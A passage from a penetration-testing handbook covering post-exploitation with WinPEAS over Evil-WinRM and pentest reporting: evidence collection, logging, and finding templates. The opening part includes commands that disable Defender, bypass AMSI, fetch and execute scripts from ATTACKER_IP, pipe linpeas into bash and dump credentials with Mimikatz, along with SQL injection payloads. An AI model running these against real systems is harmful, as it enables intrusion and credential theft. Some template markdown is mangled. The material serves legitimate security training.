*Evil-WinRM* PS C:\> Get-MpPreference
*Evil-WinRM* PS C:\> Get-MpComputerStatus

# Disable real-time monitoring (if admin)
*Evil-WinRM* PS C:\> Set-MpPreference -DisableRealtimeMonitoring $true
```

**In-memory execution:**
```bash
# Load .NET assembly in memory
*Evil-WinRM* PS C:\> $data = (New-Object Net.WebClient).DownloadData('http://ATTACKER_IP/winPEASx64.exe')
*Evil-WinRM* PS C:\> $assembly = [System.Reflection.Assembly]::Load($data)
*Evil-WinRM* PS C:\> $assembly.EntryPoint.Invoke($null, @(,$null))
```

**AMSI bypass before execution:**
```bash
*Evil-WinRM* PS C:\> Bypass-4MSI
*Evil-WinRM* PS C:\> .\winpeas.exe
```

### Integration with Other Tools

**WinPEAS + PowerUp:**
```bash
# WinPEAS for automated enumeration
*Evil-WinRM* PS C:\> .\winpeas.exe > winpeas_output.txt

# PowerUp for exploitation
*Evil-WinRM* PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
*Evil-WinRM* PS C:\> Invoke-AllChecks

# Cross-reference findings
```

**WinPEAS + Mimikatz:**
```bash
# Find credentials with WinPEAS
*Evil-WinRM* PS C:\> .\winpeas.exe windowscreds

# Dump with Mimikatz
*Evil-WinRM* PS C:\> Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
```

**WinPEAS + BloodHound:**
```bash
# System enumeration with WinPEAS
*Evil-WinRM* PS C:\> .\winpeas.exe systeminfo

# AD enumeration with SharpHound
*Evil-WinRM* PS C:\> .\SharpHound.exe -c All
```

### Troubleshooting

**WinPEAS not executing:**
```bash
# Check execution policy
*Evil-WinRM* PS C:\> Get-ExecutionPolicy

# Bypass execution policy
*Evil-WinRM* PS C:\> powershell -ExecutionPolicy Bypass -File .\winPEAS.bat

# Check for AV blocking
*Evil-WinRM* PS C:\> Get-MpComputerStatus

# Try batch version
*Evil-WinRM* PS C:\> .\winPEAS.bat
```

**Missing output:**
```bash
# Ensure proper redirection
*Evil-WinRM* PS C:\> cmd /c "winpeas.exe > output.txt 2>&1"

# Check file permissions
*Evil-WinRM* PS C:\> icacls C:\Windows\Temp
```

**Performance issues:**
```bash
# Use fast mode
*Evil-WinRM* PS C:\> .\winpeas.exe fast

# Run specific checks only
*Evil-WinRM* PS C:\> .\winpeas.exe servicesinfo
```

---

## Combined PEAS Workflow (Multi-OS Environment)

**Scenario: Mixed Windows/Linux infrastructure:**

```bash
# Phase 1: Initial foothold (Linux)
evil-winrm -i 192.168.1.10 -u user -p 'pass'
# Or SSH to Linux box
ssh user@192.168.1.20

# Phase 2: Linux enumeration
curl http://ATTACKER_IP/linpeas.sh | bash | tee linpeas_linux.txt

# Phase 3: Identify Windows targets from Linux
cat linpeas_linux.txt | grep -E "192.168|10.10" | grep "3389\|445\|5985"

# Phase 4: Pivot to Windows
evil-winrm -i 192.168.1.50 -u discovered_user -H 'HASH'

# Phase 5: Windows enumeration
*Evil-WinRM* PS C:\> upload winPEASx64.exe C:\Windows\Temp\wp.exe
*Evil-WinRM* PS C:\> .\wp.exe > output.txt
*Evil-WinRM* PS C:\> download output.txt /root/winpeas_win.txt

# Phase 6: Compile findings
grep -E "95%|YELLOW|RED" /root/linpeas_linux.txt /root/winpeas_win.txt
```

---

## Related Critical Topics

For comprehensive post-exploitation and enumeration mastery, also investigate:

- **PowerSploit/PowerUp** - PowerShell exploitation framework with privilege escalation modules complementing WinPEAS findings
- **JAWS (Just Another Windows Enum Script)** - Alternative Windows enumeration for comparison with WinPEAS results
- **Linux Exploit Suggester / Windows Exploit Suggester** - Kernel exploit identification based on system patches
- **Seatbelt** - C# enumeration tool for .NET environment detailed assessment
- **Automated Exploitation Frameworks** - Metasploit local_exploit_suggester, Empire situational awareness modules

---

# Reporting & Documentation

Professional documentation transforms technical findings into actionable intelligence. Proper evidence collection, systematic logging, and clear classification ensure findings are reproducible, defensible, and valuable for clients or CTF writeups.

## Evidence Collection

Evidence collection ensures findings are reproducible and verifiable. Every exploit, vulnerability, and discovery must be documented with sufficient detail for validation.

### Chain of Custody

```bash
# Create evidence directory structure
mkdir -p evidence/{screenshots,logs,files,pcaps,hashes,exploits}
cd evidence

# Document collection metadata
cat > metadata.txt << EOF
Assessment: [Target Name/CTF Name]
Date: $(date)
Operator: $(whoami)
System: $(uname -a)
Working Directory: $(pwd)
Start Time: $(date +%s)
EOF

# Generate unique session identifier
SESSION_ID=$(date +%Y%m%d_%H%M%S)_$(uuidgen | cut -d- -f1)
echo "Session ID: $SESSION_ID" >> metadata.txt
```

### File Artifacts

```bash
# Hash files before collection (integrity verification)
sha256sum target_file.txt > hashes/target_file.sha256
md5sum target_file.txt > hashes/target_file.md5

# Collect with metadata
cp target_file.txt files/${SESSION_ID}_target_file.txt
stat target_file.txt > files/${SESSION_ID}_target_file.stat

# Preserve timestamps
cp -p target_file.txt files/${SESSION_ID}_target_file.txt

# Create tarball with metadata
tar -czf files/${SESSION_ID}_collected_files.tar.gz --transform='s,^,evidence/,' target_file.txt
tar -tvf files/${SESSION_ID}_collected_files.tar.gz  # Verify contents

# Document file location and acquisition
cat >> files/${SESSION_ID}_manifest.txt << EOF
Original Path: /path/to/target_file.txt
Collection Time: $(date)
File Size: $(stat -c%s target_file.txt) bytes
SHA256: $(sha256sum target_file.txt | cut -d' ' -f1)
MD5: $(md5sum target_file.txt | cut -d' ' -f1)
Permissions: $(stat -c%a target_file.txt)
Owner: $(stat -c%U:%G target_file.txt)
EOF
```

### Memory Artifacts

```bash
# Process memory dump
gcore -o dumps/process_dump $(pidof target_process)

# Full memory capture (requires root)
dd if=/dev/mem of=memory_dump.raw bs=1M
# Or use modern tools
sudo apt install volatility3
sudo avml memory_dump.lime

# Document memory state
cat > dumps/memory_metadata.txt << EOF
Capture Time: $(date)
System Memory: $(free -h)
Running Processes: $(ps aux | wc -l)
Uptime: $(uptime)
Kernel: $(uname -r)
EOF

# Volatility analysis for later
volatility3 -f memory_dump.lime linux.pslist
volatility3 -f memory_dump.lime linux.bash
```

### Network Traffic

```bash
# Capture network traffic with metadata
tcpdump -i eth0 -w pcaps/${SESSION_ID}_traffic.pcap

# With timestamp and rotation
tcpdump -i eth0 -w pcaps/${SESSION_ID}_traffic_%Y%m%d_%H%M%S.pcap -G 3600 -Z root

# Capture specific traffic
tcpdump -i eth0 'host 192.168.1.10 and port 445' -w pcaps/${SESSION_ID}_smb_traffic.pcap

# Document capture parameters
cat > pcaps/${SESSION_ID}_capture_info.txt << EOF
Interface: eth0
Filter: host 192.168.1.10 and port 445
Start Time: $(date)
Duration: 3600 seconds
Packets Captured: $(tcpdump -r pcaps/${SESSION_ID}_traffic.pcap | wc -l)
EOF

# Extract artifacts from pcap
tshark -r pcaps/${SESSION_ID}_traffic.pcap -Y "http.request.method == POST" -T fields -e http.file_data > files/http_post_data.txt

# Export objects
tshark -r pcaps/${SESSION_ID}_traffic.pcap --export-objects http,extracted_files/
```

### Credential Artifacts

```bash
# Store credentials securely (encrypted)
cat > credentials.txt << EOF
Service: SSH
Host: 192.168.1.10
Username: admin
Password: P@ssw0rd123
Discovery Method: Default credentials
Timestamp: $(date)
---
Service: MySQL
Host: 192.168.1.10:3306
Username: root
Password: root
Discovery Method: Password spraying
Timestamp: $(date)
EOF

# Encrypt credentials file
gpg --symmetric --cipher-algo AES256 credentials.txt
shred -u credentials.txt  # Securely delete plaintext

# Store hashes separately
cat > hashes/discovered_hashes.txt << EOF
# NTLM Hashes
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
User1:1001:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::

# Linux Shadow Hashes
root:$6$rounds=5000$salt$hash...
user:$6$rounds=5000$salt$hash...
EOF

# Document hash sources
cat > hashes/hash_metadata.txt << EOF
Source: SAM database dump via secretsdump.py
Target: 192.168.1.10
Collection Time: $(date)
Tool: impacket-secretsdump
Command: impacket-secretsdump administrator:password@192.168.1.10
EOF
```

### Exploit Code Preservation

```bash
# Save exploit code with metadata
cat > exploits/${SESSION_ID}_exploit.py << 'EOF'
#!/usr/bin/env python3
"""
Exploit: CVE-2024-XXXX Buffer Overflow
Target: VulnApp v1.2.3
Author: Your Name
Date: 2025-10-26
Description: Stack-based buffer overflow in login function
"""
import socket
# [exploit code...]
EOF

# Document exploit execution
cat > exploits/${SESSION_ID}_exploit_log.txt << EOF
Exploit: CVE-2024-XXXX
Target: 192.168.1.10:9999
Execution Time: $(date)
Success: Yes
Shell Obtained: Yes (192.168.1.10:4444)
User Context: www-data
Command: python3 exploit.py --target 192.168.1.10 --port 9999
Output: [see below]
---
[exploit output here]
EOF

# Preserve original vulnerable binary
cp vulnerable_app files/${SESSION_ID}_vulnerable_binary
file files/${SESSION_ID}_vulnerable_binary > files/${SESSION_ID}_vulnerable_binary.info
checksec --file=files/${SESSION_ID}_vulnerable_binary >> files/${SESSION_ID}_vulnerable_binary.info
```

### Web Application Artifacts

```bash
# Save HTTP requests/responses
cat > files/${SESSION_ID}_http_request.txt << EOF
POST /login.php HTTP/1.1
Host: 192.168.1.10
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

username=admin&password=' OR '1'='1&submit=Login
EOF

cat > files/${SESSION_ID}_http_response.txt << EOF
HTTP/1.1 302 Found
Location: /dashboard.php
Set-Cookie: PHPSESSID=abc123def456
Content-Length: 0
EOF

# Burp Suite evidence
# Export Burp state: Project > Save copy
# Export specific requests: Right-click > Copy as curl command

# ZAP evidence export
# Export context: File > Export Context
# Export alerts: Report > Generate HTML Report

# Save vulnerable source code
curl http://192.168.1.10/vulnerable.php --output files/${SESSION_ID}_vulnerable_source.php

# Document vulnerability
cat > files/${SESSION_ID}_sqli_vuln.txt << EOF
URL: http://192.168.1.10/search.php?id=1
Parameter: id
Injection Point: GET parameter
Payload: 1' UNION SELECT 1,2,database()--
Result: Database name disclosed: "webapp_db"
Impact: Full database enumeration possible
EOF
```

### Database Dumps

```bash
# MySQL dump with metadata
mysqldump -h 192.168.1.10 -u root -p database_name > files/${SESSION_ID}_database_dump.sql

# Add metadata header
cat > files/${SESSION_ID}_database_metadata.txt << EOF
Database: database_name
DBMS: MySQL 5.7.32
Host: 192.168.1.10
Dump Time: $(date)
Tables: $(mysql -h 192.168.1.10 -u root -p -e "USE database_name; SHOW TABLES;" | wc -l)
Size: $(du -h files/${SESSION_ID}_database_dump.sql | cut -f1)
EOF

# Extract sensitive data
mysql -h 192.168.1.10 -u root -p -e "SELECT username,password FROM users;" database_name > files/${SESSION_ID}_users_table.txt

# Document database structure
mysql -h 192.168.1.10 -u root -p -e "SHOW TABLES;" database_name > files/${SESSION_ID}_database_schema.txt
```

### Timeline Creation

```bash
# Create activity timeline
cat > timeline.txt << EOF
# Activity Timeline - $(date)

[2025-10-26 14:32:15] Initial scan: nmap -sC -sV 192.168.1.10
[2025-10-26 14:35:42] Discovered: SMB service on port 445
[2025-10-26 14:38:10] Enumeration: enum4linux -a 192.168.1.10
[2025-10-26 14:42:33] Found: Null session enabled
[2025-10-26 14:45:18] User enum: RID cycling revealed 15 users
[2025-10-26 14:50:05] Password spray: 3 valid credentials found
[2025-10-26 14:55:22] Access gained: user 'backup' password 'backup123'
[2025-10-26 15:02:14] Privilege escalation: SUID binary /usr/bin/custom_app
[2025-10-26 15:08:45] Root access: Buffer overflow in custom_app
[2025-10-26 15:12:30] Flag captured: /root/flag.txt
[2025-10-26 15:15:00] Cleanup: Removed artifacts and logs
EOF

# Automated timeline from bash history
history | awk '{$1=""; print "[$(date +%Y-%m-%d\ %H:%M:%S)]" $0}' > timeline_commands.txt
```

## Screenshot Documentation

Visual evidence complements textual documentation and provides immediate context for findings.

### Screenshot Best Practices

```bash
# Install screenshot tools
apt install scrot flameshot maim gnome-screenshot

# Create screenshots directory
mkdir -p screenshots/{reconnaissance,exploitation,post_exploitation,flags}
```

### Automated Screenshots

```bash
# Script for timestamped screenshots
cat > capture_evidence.sh << 'EOF'
#!/bin/bash
TIMESTAMP=$(date +%Y%m%d_%H%M%S)
DESCRIPTION=$1

# Capture full screen with metadata
scrot screenshots/${TIMESTAMP}_${DESCRIPTION}.png

# Add metadata overlay (requires imagemagick)
convert screenshots/${TIMESTAMP}_${DESCRIPTION}.png \
    -pointsize 16 -fill white -box '#00000080' \
    -annotate +10+20 "Time: $(date)\nOperator: $(whoami)\nDescription: ${DESCRIPTION}" \
    screenshots/${TIMESTAMP}_${DESCRIPTION}_annotated.png

echo "[$(date)] Screenshot: ${DESCRIPTION}" >> screenshot_log.txt
EOF

chmod +x capture_evidence.sh

# Usage
./capture_evidence.sh "initial_nmap_scan"
./capture_evidence.sh "sql_injection_success"
./capture_evidence.sh "root_shell_obtained"
```

### Terminal Recording

```bash
# Record terminal session with asciinema
asciinema rec logs/${SESSION_ID}_terminal_session.cast

# Record with script command
script -f logs/${SESSION_ID}_terminal.log

# Stop recording
exit  # or Ctrl+D

# Replay session
scriptreplay logs/${SESSION_ID}_terminal.log

# Convert to text
cat logs/${SESSION_ID}_terminal.log | col -b > logs/${SESSION_ID}_terminal_clean.txt
```

### Web Application Screenshots

```bash
# Full-page screenshot with Firefox
firefox --screenshot=screenshots/${SESSION_ID}_webpage.png http://192.168.1.10

# Automated with Python and Selenium
cat > capture_webapp.py << 'EOF'
#!/usr/bin/env python3
from selenium import webdriver
from selenium.webdriver.firefox.options import Options
import time

options = Options()
options.add_argument('--headless')
driver = webdriver.Firefox(options=options)

urls = [
    'http://192.168.1.10/',
    'http://192.168.1.10/admin',
    'http://192.168.1.10/dashboard'
]

for url in urls:
    driver.get(url)
    time.sleep(2)
    filename = f"screenshots/{url.replace('/', '_').replace(':', '_')}.png"
    driver.save_screenshot(filename)
    print(f"Captured: {filename}")

driver.quit()
EOF

python3 capture_webapp.py

# Screenshot with EyeWitness
eyewitness --web --single http://192.168.1.10 -d screenshots/eyewitness_output

# Aquatone for multiple hosts
cat targets.txt | aquatone -out screenshots/aquatone_output
```

### Burp Suite Evidence

```bash
# Burp Suite screenshot workflow:
# 1. Configure: Proxy > Options > Miscellaneous > Enable automatic project backup
# 2. During testing: Right-click request > Save item
# 3. Document: Copy request as curl command
# 4. Export: Project > Save copy (*.burp)

# Extract from Burp state file (requires BurpSuite Pro API or manual export)
# Alternative: Use Burp Collaborator for out-of-band evidence
```

### Screenshot Organization

```bash
# Naming convention
# Format: YYYYMMDD_HHMMSS_phase_description.png

# Examples:
20251026_143215_recon_nmap_scan.png
20251026_145033_exploit_sql_injection.png
20251026_151822_postex_root_shell.png
20251026_152145_flag_captured.png

# Create index of screenshots
cat > screenshots/INDEX.md << 'EOF'
# Screenshot Index

## Reconnaissance Phase
- `20251026_143215_recon_nmap_scan.png` - Initial nmap scan results
- `20251026_143842_recon_service_enum.png` - Service enumeration details

## Exploitation Phase
- `20251026_145033_exploit_sql_injection.png` - SQLi payload success
- `20251026_150215_exploit_rce.png` - Remote code execution achieved

## Post-Exploitation Phase
- `20251026_151822_postex_root_shell.png` - Root shell obtained
- `20251026_152005_postex_persistence.png` - Persistence mechanism

## Flags
- `20251026_152145_flag_captured.png` - Final flag location and content
EOF
```

### Proof Screenshots (Required Elements)

```bash
# Essential elements in proof screenshots:
# 1. Timestamp (visible terminal prompt or system clock)
# 2. Target IP/hostname
# 3. Current user context (whoami, id)
# 4. Command executed
# 5. Output showing success
# 6. Unique identifier (flag, hash, specific file)

# Example proof capture script
cat > proof_capture.sh << 'EOF'
#!/bin/bash
echo "=== Proof of Exploitation ==="
echo "Timestamp: $(date)"
echo "Target: $1"
echo "Operator: $(whoami)@$(hostname)"
echo "Shell Context:"
id
pwd
echo "==========================="
echo "Flag:"
cat /root/flag.txt || cat /home/*/flag.txt || echo "Flag location: $2"
echo "==========================="
EOF

# Execute and capture
./proof_capture.sh 192.168.1.10 /root/flag.txt | tee logs/proof.txt
scrot screenshots/proof_of_exploitation.png
```

## Command Output Logging

Systematic command logging ensures reproducibility and provides audit trails for every action taken.

### Bash History Enhancement

```bash
# Configure enhanced bash history
cat >> ~/.bashrc << 'EOF'
# Enhanced history for security testing
export HISTTIMEFORMAT="%F %T "
export HISTSIZE=10000
export HISTFILESIZE=20000
export HISTCONTROL=ignoredups:erasedups
shopt -s histappend
PROMPT_COMMAND="history -a; history -c; history -r; $PROMPT_COMMAND"

# Log all commands with timestamps
export PROMPT_COMMAND='echo "$(date "+%Y-%m-%d %H:%M:%S") $(hostname) $(pwd) $(history 1)" >> ~/.bash_eternal_history'
EOF

source ~/.bashrc

# Create session-specific log
SESSION_LOG="logs/${SESSION_ID}_commands.log"
export PROMPT_COMMAND="history 1 >> $SESSION_LOG"
```

### Script Command

```bash
# Record entire terminal session
script -f -q logs/${SESSION_ID}_full_session.log

# With timing information (for replay)
script -f -q -t logs/${SESSION_ID}_session.log 2>logs/${SESSION_ID}_timing.txt

# Replay session
scriptreplay -t logs/${SESSION_ID}_timing.txt logs/${SESSION_ID}_session.log

# Specify typescript file
script --timing=logs/timing.txt logs/typescript

# Append to existing log
script -a logs/existing_session.log
```

### Tool-Specific Logging

**Nmap:**

```bash
# All output formats simultaneously
nmap -sC -sV -oA logs/${SESSION_ID}_nmap_scan 192.168.1.10

# This creates:
# - logs/${SESSION_ID}_nmap_scan.nmap (normal)
# - logs/${SESSION_ID}_nmap_scan.gnmap (grepable)
# - logs/${SESSION_ID}_nmap_scan.xml (XML)

# Verbose output to file
nmap -sC -sV -v 192.168.1.10 | tee logs/${SESSION_ID}_nmap_verbose.log
```

**Metasploit:**

```bash
# Enable logging in msfconsole
msf6 > spool logs/${SESSION_ID}_msf.log

# All commands now logged
msf6 > use exploit/multi/handler
msf6 > set LHOST 10.10.14.5
msf6 > run

# Stop logging
msf6 > spool off

# Alternative: Log entire msfconsole session
script logs/${SESSION_ID}_msf_session.log
msfconsole
# ... work ...
exit
# End script: Ctrl+D
```

**SQLMap:**

```bash
# SQLMap automatically logs to ~/.local/share/sqlmap/output/

# Specify custom log file
sqlmap -u "http://192.168.1.10/page.php?id=1" --batch --output-dir=logs/${SESSION_ID}_sqlmap

# Traffic log (HTTP requests/responses)
sqlmap -u "http://192.168.1.10/page.php?id=1" -t logs/${SESSION_ID}_sqlmap_traffic.txt

# Copy sqlmap results
cp -r ~/.local/share/sqlmap/output/192.168.1.10 logs/${SESSION_ID}_sqlmap_results/
```

**Burp Suite:**

```bash
# Configure Burp logging:
# Proxy > Options > Proxy Listeners > Edit > Request handling
# Check "Support invisible proxying"

# Export specific requests:
# Right-click > Copy as curl command
# Save to: logs/${SESSION_ID}_burp_requests.sh

# Example exported request
cat > logs/${SESSION_ID}_burp_request_001.sh << 'EOF'
curl -i -s -k -X POST \
  -H 'Host: 192.168.1.10' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-binary 'username=admin&password=password' \
  'http://192.168.1.10/login.php'
EOF
```

**Hydra:**

```bash
# Hydra logging
hydra -L users.txt -P passwords.txt 192.168.1.10 ssh -o logs/${SESSION_ID}_hydra.log

# Verbose output
hydra -L users.txt -P passwords.txt 192.168.1.10 ssh -V | tee logs/${SESSION_ID}_hydra_verbose.log
```

**Gobuster:**

```bash
# Gobuster with output
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt -o logs/${SESSION_ID}_gobuster.txt

# With verbose output
gobuster dir -u http://192.168.1.10 -w /usr/share/wordlists/dirb/common.txt -v 2>&1 | tee logs/${SESSION_ID}_gobuster_verbose.log
```

### Centralized Logging Script

```bash
# Create logging wrapper
cat > log_command.sh << 'EOF'
#!/bin/bash
# Usage: ./log_command.sh "description" command args...

TIMESTAMP=$(date +%Y%m%d_%H%M%S)
DESCRIPTION=$1
shift

LOGFILE="logs/${TIMESTAMP}_${DESCRIPTION}.log"

echo "=== Command Execution Log ===" | tee -a $LOGFILE
echo "Time: $(date)" | tee -a $LOGFILE
echo "Description: $DESCRIPTION" | tee -a $LOGFILE
echo "Command: $@" | tee -a $LOGFILE
echo "Working Directory: $(pwd)" | tee -a $LOGFILE
echo "=========================" | tee -a $LOGFILE
echo "" | tee -a $LOGFILE

# Execute and log
"$@" 2>&1 | tee -a $LOGFILE

EXIT_CODE=$?

echo "" | tee -a $LOGFILE
echo "=========================" | tee -a $LOGFILE
echo "Exit Code: $EXIT_CODE" | tee -a $LOGFILE
echo "Completed: $(date)" | tee -a $LOGFILE

exit $EXIT_CODE
EOF

chmod +x log_command.sh

# Usage examples
./log_command.sh "initial_scan" nmap -sC -sV 192.168.1.10
./log_command.sh "smb_enum" enum4linux -a 192.168.1.10
./log_command.sh "password_spray" crackmapexec smb 192.168.1.0/24 -u users.txt -p 'Password123'
```

### Automated Command Logging

```bash
# Zsh with persistent history
cat >> ~/.zshrc << 'EOF'
setopt EXTENDED_HISTORY
setopt INC_APPEND_HISTORY
setopt SHARE_HISTORY
HISTFILE=~/.zsh_history
HISTSIZE=100000
SAVEHIST=100000
EOF

# Bash with syslog integration
cat >> ~/.bashrc << 'EOF'
# Log to syslog
function log_command() {
    logger -t "bash_audit" -p local6.notice "USER=$(whoami) PWD=$(pwd) CMD=$(history 1 | sed 's/^[ ]*[0-9]\+[ ]*//')"
}
export PROMPT_COMMAND='log_command'
EOF

# View logged commands
tail -f /var/log/syslog | grep bash_audit
```

## Finding Classification

Proper classification communicates risk, impact, and urgency to stakeholders.

### Severity Ratings

**CVSS (Common Vulnerability Scoring System) Framework:**

```bash
# CVSS v3.1 Calculator components
# Base Score (0.0 - 10.0)
# - Attack Vector (AV): Network/Adjacent/Local/Physical
# - Attack Complexity (AC): Low/High
# - Privileges Required (PR): None/Low/High
# - User Interaction (UI): None/Required
# - Scope (S): Unchanged/Changed
# - Confidentiality (C): None/Low/High
# - Integrity (I): None/Low/High
# - Availability (A): None/Low/High

# Examples:
# Remote Code Execution (no auth): 9.8 (Critical)
# SQL Injection (authenticated): 8.8 (High)
# XSS (stored): 6.1 (Medium)
# Information Disclosure: 5.3 (Medium)
# Self-XSS: 3.5 (Low)
```

**Custom Severity Matrix:**

````bash
# Create finding classification template
cat > finding_template.md << 'EOF'
# Finding Classification Template

## Finding ID
F-001

## Title
[Descriptive title, e.g., "SQL Injection in Login Form"]

## Severity
**Critical** / High / Medium / Low / Informational

### Severity Justification
- Impact: [Critical/High/Medium/Low]
- Exploitability: [Easy/Moderate/Difficult]
- Affected Users: [All/Some/Admin only]
- Data at Risk: [Credentials/PII/Business data/None]

## CVSS Score
Base Score: X.X (Severity)
Vector String: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H

## Category
- [ ] Authentication Bypass
- [ ] Authorization Flaw
- [ ] Injection (SQL/Command/LDAP/etc.)
- [ ] Broken Access Control
- [ ] Security Misconfiguration
- [ ] Sensitive Data Exposure
- [ ] Insufficient Logging
- [ ] Cross-Site Scripting (XSS)
- [ ] Insecure Deserialization
- [ ] Using Components with Known Vulnerabilities

## Affected Asset
- Host: 192.168.1.10
- Service: Web Application
- Component: /login.php
- Version: Apache 2.4.41, PHP 7.4.3

## Description
[Detailed technical description of the vulnerability]

The login form at http://192.168.1.10/login.php is vulnerable to SQL injection in the 'username' parameter. An attacker can bypass authentication by injecting SQL commands, leading to unauthorized access to the administrative panel.

## Steps to Reproduce
1. Navigate to http://192.168.1.10/login.php
2. Enter the following in the username field: `admin' OR '1'='1'--`
3. Enter any value in the password field
4. Click "Login"
5. Observe successful authentication as administrator

## Proof of Concept
```bash
curl -X POST http://192.168.1.10/login.php \
  -d "username=admin' OR '1'='1'--&password=anything" \
  -v
````

**Response:**

```
HTTP/1.1 302 Found
Location: /admin/dashboard.php
Set-Cookie: PHPSESSID=abc123xyz789
```

## Evidence

- Screenshot: screenshots/20251026_145033_sqli_success.png
- Request/Response: logs/20251026_145033_http_traffic.txt
- Database dump: files/20251026_150215_database_dump.sql

## Impact

**Technical Impact:**

- Complete database compromise
- Authentication bypass
- Unauthorized access to sensitive data
- Potential for data modification/deletion

**Business Impact:**

- Exposure of customer PII
- Reputational damage
- Regulatory compliance violations (GDPR, PCI-DSS)
- Financial loss from data breach

**Affected Data:**

- 10,000+ customer records (names, emails, passwords)
- Payment information (credit card numbers, CVV)
- Administrative credentials

## Remediation

### Immediate Actions (Critical - Implement within 24 hours)

1. Disable vulnerable endpoint temporarily
2. Review application logs for exploitation attempts
3. Reset all user passwords
4. Notify affected users

### Short-term Solutions (High Priority - Within 1 week)

1. Implement parameterized queries/prepared statements
2. Apply input validation and sanitization
3. Implement Web Application Firewall (WAF) rules
4. Deploy updated code to production

### Long-term Solutions (Within 1 month)

1. Conduct comprehensive code review
2. Implement security testing in SDLC
3. Provide secure coding training to developers
4. Establish regular security assessments

## Remediation Code Example

**Vulnerable Code:**

```php
$username = $_POST['username'];
$password = $_POST['password'];
$query = "SELECT * FROM users WHERE username='$username' AND password='$password'";
$result = mysql_query($query);
```

**Secure Code:**

```php
$username = $_POST['username'];
$password = $_POST['password'];
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
$result = $stmt->fetch();
```

## References

- OWASP Top 10 2021: A03 - Injection
- CWE-89: SQL Injection
- https://owasp.org/www-community/attacks/SQL_Injection
- https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html

## Additional Notes

- Vulnerability affects all user input fields (username, password, search)
- Application uses MySQL database (version 5.7.32)
- No WAF or IDS/IPS detected
- Application does not implement rate limiting

## Timeline

- 2025-10-26 14:50:00 - Vulnerability discovered
- 2025-10-26 15:15:00 - Exploitation confirmed
- 2025-10-26 15:30:00 - Finding documented
- 2025-10-26 16:00:00 - Reported to client

## Status

- [ ] Identified
- [x] Validated
- [x] Documented
- [ ] Reported
- [ ] Remediated
- [ ] Verified

## Reviewer

- Discovered by: [Your Name]
- Validated by: [Peer Name]
- Approved by: [Lead Name] EOF

````

### Finding Categories (OWASP Top 10 2021)

```bash
# Create category definitions
cat > finding_categories.md << 'EOF'
# Finding Categories

## A01:2021 â€“ Broken Access Control
**Description:** Restrictions on authenticated users not properly enforced
**Examples:**
- Insecure Direct Object Reference (IDOR)
- Path traversal
- Missing function-level access control
- Elevation of privilege

**Severity Range:** Medium to Critical

## A02:2021 â€“ Cryptographic Failures
**Description:** Failures related to cryptography leading to sensitive data exposure
**Examples:**
- Transmitting data in clear text (no TLS)
- Weak or old cryptographic algorithms
- Default or weak keys
- Missing encryption of sensitive data

**Severity Range:** Medium to High

## A03:2021 â€“ Injection
**Description:** User-supplied data not validated, filtered, or sanitized
**Examples:**
- SQL Injection
- NoSQL Injection
- Command Injection
- LDAP Injection
- XPath Injection

**Severity Range:** High to Critical

## A04:2021 â€“ Insecure Design
**Description:** Missing or ineffective control design
**Examples:**
- Missing rate limiting
- Insecure password reset
- Unlimited resource allocation
- Business logic flaws

**Severity Range:** Medium to High

## A05:2021 â€“ Security Misconfiguration
**Description:** Missing hardening, unnecessary features enabled
**Examples:**
- Default credentials
- Verbose error messages
- Unnecessary services running
- Missing security headers

**Severity Range:** Low to High

## A06:2021 â€“ Vulnerable and Outdated Components
**Description:** Using components with known vulnerabilities
**Examples:**
- Outdated libraries/frameworks
- Unpatched OS/applications
- EOL software
- Unknown component inventory
````

**Severity Range:** Low to Critical (depends on exploitability)

**Detection Methods:**

```bash
# Identify outdated components
whatweb http://192.168.1.10
nikto -h http://192.168.1.10

# Check for known CVEs
searchsploit apache 2.4.29
nmap --script vulners 192.168.1.10
```

## A07:2021 â€“ Identification and Authentication Failures

**Description:** Authentication and session management implemented incorrectly **Examples:**

- Weak password requirements
- Credential stuffing vulnerabilities
- Session fixation
- Missing MFA
- Exposed session tokens

**Severity Range:** Medium to Critical

## A08:2021 â€“ Software and Data Integrity Failures

**Description:** Code and infrastructure don't protect against integrity violations **Examples:**

- Insecure CI/CD pipeline
- Auto-update without integrity verification
- Insecure deserialization
- Unsigned or unverified software updates

**Severity Range:** Medium to Critical

## A09:2021 â€“ Security Logging and Monitoring Failures

**Description:** Insufficient logging, monitoring, and incident response **Examples:**

- No logging of security events
- Logs not monitored
- Logs stored insecurely
- Insufficient audit trail

**Severity Range:** Low to Medium

## A10:2021 â€“ Server-Side Request Forgery (SSRF)

**Description:** Web application fetches remote resource without validating URL **Examples:**

- Internal port scanning
- Access to cloud metadata services
- Bypass of firewall rules
- Reading local files

**Severity Range:** Medium to High EOF

````

### Risk Rating Matrix

```bash
# Create risk matrix calculator
cat > risk_calculator.py << 'EOF'
#!/usr/bin/env python3
"""
Risk Rating Calculator
Calculates overall risk based on Likelihood and Impact
"""

def calculate_risk(likelihood, impact):
    """
    Likelihood: Low (1), Medium (2), High (3)
    Impact: Low (1), Medium (2), High (3), Critical (4)
    """
    risk_matrix = {
        (1, 1): "Low",
        (1, 2): "Low",
        (1, 3): "Medium",
        (1, 4): "Medium",
        (2, 1): "Low",
        (2, 2): "Medium",
        (2, 3): "High",
        (2, 4): "High",
        (3, 1): "Medium",
        (3, 2): "High",
        (3, 3): "Critical",
        (3, 4): "Critical"
    }
    
    score = likelihood * impact
    rating = risk_matrix.get((likelihood, impact), "Unknown")
    
    return {
        'score': score,
        'rating': rating,
        'likelihood': ['', 'Low', 'Medium', 'High'][likelihood],
        'impact': ['', 'Low', 'Medium', 'High', 'Critical'][impact]
    }

# Example usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) != 3:
        print("Usage: risk_calculator.py <likelihood:1-3> <impact:1-4>")
        sys.exit(1)
    
    likelihood = int(sys.argv[1])
    impact = int(sys.argv[2])
    
    result = calculate_risk(likelihood, impact)
    
    print(f"Likelihood: {result['likelihood']}")
    print(f"Impact: {result['impact']}")
